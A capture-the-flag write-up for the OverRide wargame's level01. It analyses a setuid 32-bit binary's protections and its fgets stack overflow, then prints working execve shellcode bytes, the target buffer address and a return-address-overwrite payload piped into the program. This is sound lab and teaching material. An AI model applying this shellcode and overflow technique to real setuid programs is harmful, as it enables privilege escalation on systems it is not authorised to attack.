# OverRide (level01)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/level01/level01`
- Type: **ELF 32-bit LSB executable** (`file -b ~/level01`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/level01`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/level01
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 /home/users/level01/level01
```

These describe the binary's privileges.
|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with level02's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/level01
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ⚠️     | Partial. GOT is still writable but harded to reach.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are executable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

# Vulnerability & Analysis

The decompiled binary (cf. [source](source.c)) is subject to a "Stack-based Buffer Overflow" ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)) vulnerability.

The username and password are hardcoded and recoverable by static analysis, but providing them grants nothing. The password comparison result is always considered wrong.

Proving the username allows access to a `fgets()` call, that reads up to 100 bytes into a 64-byte buffer: this triggers a 36-byte overflow. The NX flag being disabled, this could be sufficient to hold a malicious shellcode and redirect control flow to it by overwriting `main()`'s saved return address.

To discover and verify the offset to reach `main()`'s saved return address we can either:
- manually reconstruct its stack frame via [source.asm](./source.asm).
- feed the program a cyclic pattern of unique 4-byte windows and inspect what value lands in `EIP` when it crashes.
We'll use the latter as it's easier.

# Exploit

## Shell code

Let's start by generating our shellcode.  
We wish for it to open a shell once executed.  
We defined this behaviour in [shellcode.asm](./Ressources/data/shellcode.asm) but it must be converted into a little-endian octal escape sequence for practical reasons.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/shellcode.asm";
# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";
# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";
# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";
# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
# \061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
# 25
```

We now need to define where our shellcode is gonna live. A good candidate is `a_user_name`:
- It is 256-bytes long *(> 25)*.
- Is is a global variable. It's address won't shift with the stack with Partial RELRO.
- It can be filled via user input.
```sh
$ readelf -s ~/level01  | grep 'a_user_name'
    69: 0804a040   100 OBJECT  GLOBAL DEFAULT   25 a_user_name
```
In little-endian octal escape sequence, it would equal: `\100\240\004\010`

We'll shift this address 7 bytes because we need to prepend to the shellcode the login expected by the program: `"dat_wil"`: `\107\240\004\010`.

## Payload

As defined before, `main()`'s return address is located 80 bytes from the start of the buffer we'll write it in, considering overflow.
Our payload would look something like this. Please refer to [getflag.sh](./Ressources/getflag.sh) for an actual execution.
```sh
shellcode="$(generate_shellcode 'shellcode.asm')";
shellcode_addr="\107\240\004\010";
user_input_1="$(printf '%s%b' 'dat_wil' "$shellcode")";
user_input_2="$(printf '%s%b' 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB' "$shellcode_addr")";
(printf '%b\n' "$user_input_1"; printf '%b\n' "$user_input_2") | ~/level01;
```

And there we are !
